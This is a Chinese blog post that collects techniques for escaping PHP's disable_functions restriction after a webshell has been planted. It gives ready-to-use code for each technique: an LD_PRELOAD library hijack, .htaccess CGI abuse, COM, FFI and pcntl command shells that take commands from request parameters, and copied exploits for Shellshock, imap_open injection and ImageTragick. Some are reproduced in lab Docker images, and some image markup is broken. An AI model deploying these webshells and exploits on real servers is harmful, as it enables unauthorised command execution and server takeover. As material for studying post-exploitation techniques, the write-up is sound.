---
layout:     post
title:      disable_functions绕过
subtitle:   php
date:       2024-03-11
author:     lyk
header-img: img/post-bg-debug.png
catalog: true
tags:
    - php
---

# 0x01 前言

前几个月在某行动中发现webshell执行命令返回`ret=127`，听前辈说起这是由于disable_functions的限制,到暑假才又想起这个事,特此总结与复现了一些bypass的姿势.如有错误，请师傅们不吝赐教。

# 0x02 disable_functions

disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001847-239897fc-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001847-239897fc-fc52-1.png)

比如拿到一个webshell,用管理工具去连接,执行命令发现`ret=127`,实际上就是因为被这个限制的原因

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001851-25695a6c-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001851-25695a6c-fc52-1.png)

# 0x03 黑名单

```
assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open
```

观察php.ini 中的 disable_function 漏过了哪些函数，若存在漏网之鱼，直接利用即可。

# 0x04 利用Linux环境变量LD_PRELOAD

#### 初阶

```
LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。
```

总的来说就是=`LD_PRELOAD`指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果。

思路为:

1. 创建一个.so文件,linux的动态链接库文件
2. 使用putenv函数将`LD_PRELOAD`路径设置为我们自己创建的动态链接库文件
3. 利用某个函数去触发该动态链接库

这里以`mail()`函数举例。
在底层c语言中,`mail.c`中会调用`sendmail`，而sendmail_path使从ini文件中说明

```
; For Unix only.  You may supply arguments as well (default: "sendmail -t -i"). 
;sendmail_path =
```

默认为"sendmail -t -i"

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002435-f2eb8406-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002435-f2eb8406-fc52-1.png)

但是sendmail并不是默认安装的,需要自己下载

使用命令`readelf -Ws /usr/sbin/sendmail`可以看到sendmail调用了哪些库函数,这里选择`geteuid`

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002445-f8c39828-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002445-f8c39828-fc52-1.png)

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002448-fa3a8da6-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002448-fa3a8da6-fc52-1.png)

创建一个`test.c`文件,并定义一个`geteuid`函数,目的是劫持该函数。

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
    system("whoami > /var/tmp/sd.txt");
}
int geteuid()
{
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}
```

使用gcc编译为.so文件

```
gcc -c -fPIC test.c -o test
gcc -shared test -o test.so
```

这里有个坑:不要在windows上编译,编译出来是`MZ`头,不是`ELF`。

然后再上传test.so到指定目录下。

最后创建`shell.php`文件,上传到网站目录下,这里.so文件路径要写对。

```
<?php
putenv("LD_PRELOAD=/var/www/test.so");
mail("","","","","");
?>
```

再理一下整个过程:当我们访问shell.php文件的时候,先会将`LD_PRELOAD`路径设置为恶意的.so文件，然后触发mail()函数,mail函数会调用sendmail函数,sendmail函数会调用库函数geteuid,而库函数geteuid已经被优先加载,这时执行geteuid就是执行的我们自己定义的函数,并执行payload(),也就是代码中的`whoami`命令写入到sd.txt中。

由于拿到的webshell很有可能是`www-data`这种普通权限。
整个过程要注意权限问题,要可写的目录下。

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001917-3503f540-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001917-3503f540-fc52-1.png)

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001920-371d1fb4-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001920-371d1fb4-fc52-1.png)

web访问页面没有文件写出,可以看看定义的目录是否有权限。

#### 进阶版

在整个流程中,唯一担心的是sendmail没有安装怎么办,它可不是默认安装的,而拿到的webshell权限一般也不高,无法自行安装,也不能改php.ini。

而有前辈早已指出:[无需sendmail：巧用LD_PRELOAD突破disable_functions](https://www.freebuf.com/web/192052.html)
细节已经说的非常明白,这里只复现,在此不再画蛇添足。

去github下载三个重要文件:
bypass_disablefunc.php,bypass_disablefunc_x64.so或bypass_disablefunc_x86.so,bypass_disablefunc.c
将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so传到目标有权限的目录中。
这里很有可能无法直接上传到web目录,解决办法就是上传到有权限的目录下,并用include去包含。

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001930-3caa7210-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001930-3caa7210-fc52-1.png)

这里我已经卸载了sendmail文件

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001932-3e66cc84-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001932-3e66cc84-fc52-1.png)

注意区分post和get

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001935-3fffbff6-fc52-1.png)](

# 0x05 利用 Apache Mod CGI

利用条件:

- Apache + PHP (apache 使用 apache_mod_php)
- Apache 开启了 cgi, rewrite
- Web 目录给了 AllowOverride 权限

#### 关于mod_cgi是什么

http://httpd.apache.org/docs/current/mod/mod_cgi.html
任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。
当Apache 开启了cgi, rewrite时，我们可以利用.htaccess文件，临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用.htaccess文件进行配置。

#### 如何利用

由于环境搭建困难,使用蚁剑的[docker](https://github.com/AntSwordProject/AntSword-Labs)

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002112-79b04982-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002112-79b04982-fc52-1.png)

在web目录下上传`.htaccess`文件

```
Options +ExecCGI
AddHandler cgi-script .ant
```

上传shell.ant

```
#!/bin/sh
echo Content-type: text/html
echo ""
echo&&id
```

由于目标是liunx系统,linux中CGI比较严格。这里也需要去liunx系统创建文件上传,如果使用windows创建文件并上传是无法解析的。

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002119-7e18cdfa-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002119-7e18cdfa-fc52-1.png)

直接访问shell.xxx ,这里报错,是因为权限的问题

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002123-802f726a-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002123-802f726a-fc52-1.png)

直接使用蚁剑修改权限

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002126-81ce33b8-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002126-81ce33b8-fc52-1.png)

复现成功

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002129-83ad77ac-fc52-1.png)](

# 0x06 利用Windows组件COM绕过

查看`com.allow_dcom`是否开启,这个默认是不开启的。

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001858-2a0fac74-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001858-2a0fac74-fc52-1.png)

创建一个COM对象,通过调用COM对象的`exec`替我们执行命令

```
<?php
$wsh = isset($_GET['wsh']) ? $_GET['wsh'] : 'wscript';
if($wsh == 'wscript') {
    $command = $_GET['cmd'];
    $wshit = new COM('WScript.shell') or die("Create Wscript.Shell Failed!");
    $exec = $wshit->exec("cmd /c".$command);
    $stdout = $exec->StdOut();
    $stroutput = $stdout->ReadAll();
    echo $stroutput;
}
elseif($wsh == 'application') {
    $command = $_GET['cmd'];
    $wshit = new COM("Shell.Application") or die("Shell.Application Failed!");
    $exec = $wshit->ShellExecute("cmd","/c ".$command);
} 
else {
  echo(0);
}
?>
```

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001904-2d8c6086-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001904-2d8c6086-fc52-1.png)

/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001935-3fffbff6-fc52-1.png)

# 0x07 利用PHP7.4 FFI绕过

FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。
当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。
具体请参考[Foreign Function Interface](https://www.php.net/manual/en/book.ffi.php)

当前php版本为7.4.3

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001941-433af5f0-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001941-433af5f0-fc52-1.png)

先看FFI是否开启,并且ffi.enable需要设置为true

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001943-44fc8e58-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001943-44fc8e58-fc52-1.png)

使用FFI::cdef创建一个新的FFI对象

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001948-478cb378-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001948-478cb378-fc52-1.png)

通过c语言的system去执行,绕过disable functions。
将返回结果写入/tmp/SD，并在每次读出结果后用unlink()函数删除它。

```
<?php
$cmd=$_GET['cmd'];
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("$cmd > /tmp/SD");       //由GET传参的任意代码执行
echo file_get_contents("/tmp/SD");
@unlink("/tmp/SD");
?>
```

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001952-4a447d8a-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001952-4a447d8a-fc52-1.png)

# 0x08 利用Bash Shellshock(CVE-2014-6271)破壳漏洞

利用条件php < 5.6.2 & bash <= 4.3（破壳）

Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。

简单测试是否存在破壳漏洞:
命令行输入`env x='() { :;}; echo vulnerable' bash -c "echo this is a test"`
如果输出了`vulnerable`，则说明存在bash破壳漏洞

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001958-4dee2b3e-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814001958-4dee2b3e-fc52-1.png)

[EXP](https://www.exploit-db.com/exploits/35146)如下:

```
<?php 
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
# Google Dork: none 
# Date: 10/31/2014 
# Exploit Author: Ryan King (Starfall) 
# Vendor Homepage: http://php.net 
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
# Version: 5.* (tested on 5.6.2) 
# Tested on: Debian 7 and CentOS 5 and 6 
# CVE: CVE-2014-6271 

function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
   $tmp = tempnam(".","data"); 
   putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1"); 
   // In Safe Mode, the user may only alter environment variableswhose names 
   // begin with the prefixes supplied by this directive. 
   // By default, users will only be able to set environment variablesthat 
   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
   // PHP will let the user modify ANY environment variable! 
   //mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail 
   error_log('a',1);
   $output = @file_get_contents($tmp); 
   @unlink($tmp); 
   if($output != "") return $output; 
   else return "No output, or not vuln."; 
} 
echo shellshock($_REQUEST["cmd"]); 
?>
```

选择可上传目录路径,上传exp

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002007-5346618c-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002007-5346618c-fc52-1.png)

包含文件执行

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002017-590093ae-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002017-590093ae-fc52-1.png)

# 0x09 利用imap_open()绕过

利用条件需要安装iamp扩展,命令行输入:`apt-get install php-imap`
在php.ini中开启imap.enable_insecure_rsh选项为On；重启服务。

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002025-5d85c368-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002025-5d85c368-fc52-1.png)

基本原理为:

```
PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。
```

EXP:

```
<?php 
error_reporting(0); 
if (!function_exists('imap_open')) { 
die("no imap_open function!"); 
} 
$server = "x -oProxyCommand=echot" . base64_encode($_GET['cmd'] .
">/tmp/cmd_result") . "|base64t-d|sh}"; 
//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] .
">/tmp/cmd_result") . '|base64$IFS$()-d|sh}'; 
imap_open('{' . $server . ':143/imap}INBOX', '', ''); // or
var_dump("nnError: ".imap_last_error()); 
sleep(5); 
echo file_get_contents("/tmp/cmd_result"); 
?>
```

# 0x0a 利用Pcntl组件

如果目标机器安装并启用了php组件Pcntl,就可以使用pcntl_exec()这个pcntl插件专有的命令执行函数来执行系统命令,也算是过黑名单的一钟,比较简单。

[exp](https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/exp/pcntl_exec/exp.php)为:

```
#pcntl_exec().php
<?php pcntl_exec("/bin/bash", array("/tmp/b4dboy.sh"));?>
#/tmp/b4dboy.sh
#!/bin/bash
ls -l /
```

# 0x0b 利用ImageMagick 漏洞绕过(CVE-2016–3714)

利用条件:

- 目标主机安装了漏洞版本的imagemagick（<= 3.3.0）
- 安装了php-imagick拓展并在php.ini中启用；
- 编写php通过new Imagick对象的方式来处理图片等格式文件；
- PHP >= 5.4

#### ImageMagick介绍

ImageMagick是一套功能强大、稳定而且开源的工具集和开发包,可以用来读、写和处理超过89种基本格式的图片文件,包括流行的TIFF、JPEG、GIF、 PNG、PDF以及PhotoCD等格式。众多的网站平台都是用他渲染处理图片。可惜在3号时被公开了一些列漏洞,其中一个漏洞可导致远程执行代码(RCE),如果你处理用户提交的图片。该漏洞是针对在野外使用此漏洞。许多图像处理插件依赖于ImageMagick库,包括但不限于PHP的imagick,Ruby的rmagick和paperclip,以及NodeJS的ImageMagick等。

产生原因是因为字符过滤不严谨所导致的执行代码. 对于文件名传递给后端的命令过滤不足,导致允许多种文件格式转换过程中远程执行代码。

据ImageMagick官方，目前程序存在一处远程命令执行漏洞（CVE-2016-3714），当其处理的上传图片带有攻击代码时，可远程实现远程命令执行，进而可能控制服务器，此漏洞被命名为ImageTragick。
[EXP](https://www.exploit-db.com/exploits/39766)如下:

```
<?php
echo "Disable Functions: " . ini_get('disable_functions') . "\n";

$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') {
    $command = 'id';
}

$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|$command")'
pop graphic-context
EOF;

file_put_contents("KKKK.mvg", $exploit);
$thumb = new Imagick();
$thumb->readImage('KKKK.mvg');
$thumb->writeImage('KKKK.png');
$thumb->clear();
$thumb->destroy();
unlink("KKKK.mvg");
unlink("KKKK.png");
?>
```

漏洞原理参考p牛文章:https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html

#### 漏洞复现

获取和运行镜像

```
docker pull medicean/vulapps:i_imagemagick_1
docker run -d -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1
```

访问`phpinfo.php`,发现开启了imagemagick服务

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002056-7022c534-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002056-7022c534-fc52-1.png)

进入容器:`docker run -t -i medicean/vulapps:i_imagemagick_1 "/bin/bash"`

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002100-72a1ea42-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002100-72a1ea42-fc52-1.png)

查看`poc.php`,这其实是已经写好的poc,执行命令就是`ls -la`

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002104-74c9f116-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002104-74c9f116-fc52-1.png)

验证poc,在容器外执行`docker exec i_imagemagick_1 convert /poc.png 1.png`

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002107-76c3197a-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002107-76c3197a-fc52-1.png)

poc可自行构建

/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002129-83ad77ac-fc52-1.png)

# 0x0c 利用攻击PHP-FPM

利用条件

- Linux 操作系统
- PHP-FPM
- 存在可写的目录, 需要上传 .so 文件

关于什么是PHP-FPM,这个可以看https://www.php.cn/php-weizijiaocheng-455614.html
关于如何攻击PHP-FPM,请看这篇[浅析php-fpm的攻击方式](https://xz.aliyun.com/t/5598)

蚁剑环境

```
git clone https://github.com/AntSwordProject/AntSword-Labs.git
cd AntSword-Labs/bypass_disable_functions/5
docker-compose up -d
```

连接shell后无法执行命令

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002133-868a4cf2-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002133-868a4cf2-fc52-1.png)

查看phpinfo,发现目标主机配置了`FPM/Fastcgi`

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002136-8847b82c-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002136-8847b82c-fc52-1.png)

使用插件

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002139-89f7395e-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002139-89f7395e-fc52-1.png)

要注意该模式下需要选择 PHP-FPM 的接口地址，需要自行找配置文件查 FPM 接口地址，本例中PHP-FPM 的接口地址，发现是 127.0.0.1:9000,所以这里改为127.0.0.1：9000

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002142-8ba4e972-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002142-8ba4e972-fc52-1.png)

但是这里我死活利用不了

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002145-8d6880c0-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002145-8d6880c0-fc52-1.png)

这里换了几个版本还是不行，但看网上师傅利用是没问题的
有感兴趣想复现师傅看这里:https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5

# 0x0d 利用 GC UAF

利用条件

- Linux 操作系统
- PHP7.0 - all versions to date
- PHP7.1 - all versions to date
- PHP7.2 - all versions to date
- PHP7.3 - all versions to date

[EXP](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)
[关于原理](http://3xp10it.cc/二进制/2017/04/19/PHP中的内存破坏漏洞利用学习(1st)/)
通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令。

搭建环境

```
cd AntSword-Labs/bypass_disable_functions/6
docker-compose up -d
```

受到disable_function无法执行命令

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002151-90fd15e8-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002151-90fd15e8-fc52-1.png)

使用插件成功执行后弹出一个新的虚拟终端，成功bypass

